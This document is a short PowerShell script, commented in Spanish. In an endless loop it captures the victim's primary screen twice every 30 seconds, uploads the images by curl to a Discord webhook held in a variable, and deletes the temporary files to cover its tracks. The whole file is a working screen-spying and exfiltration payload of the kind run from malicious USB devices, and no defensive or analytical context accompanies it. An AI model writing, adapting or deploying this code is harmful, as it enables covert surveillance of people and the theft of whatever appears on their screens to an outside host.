# Definir la URL del webhook de Discord
$webhookUrl = "$dc"

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
While ($true) {
    # Tomar la primera captura de pantalla
    $firstScreenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $firstGraphic = [System.Drawing.Graphics]::FromImage($firstScreenshot)
    $firstGraphic.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
    
    # Guardar la primera captura de pantalla en un archivo temporal
    $firstFilePath = "$env:TEMP\SC1.png"
    $firstScreenshot.Save($firstFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Tomar la segunda captura de pantalla
    $secondScreenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $secondGraphic = [System.Drawing.Graphics]::FromImage($secondScreenshot)
    $secondGraphic.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
    
    # Guardar la segunda captura de pantalla en un archivo temporal
    $secondFilePath = "$env:TEMP\SC2.png"
    $secondScreenshot.Save($secondFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Enviar ambas capturas de pantalla al webhook de Discord
    curl.exe -F "file1=@$firstFilePath" -F "file2=@$secondFilePath" $webhookUrl
    
    # Eliminar los archivos temporales
    Remove-Item -Path $firstFilePath
    Remove-Item -Path $secondFilePath
    
    # Esperar 30 segundos antes de tomar la próxima captura
    Start-Sleep -Seconds 30
}
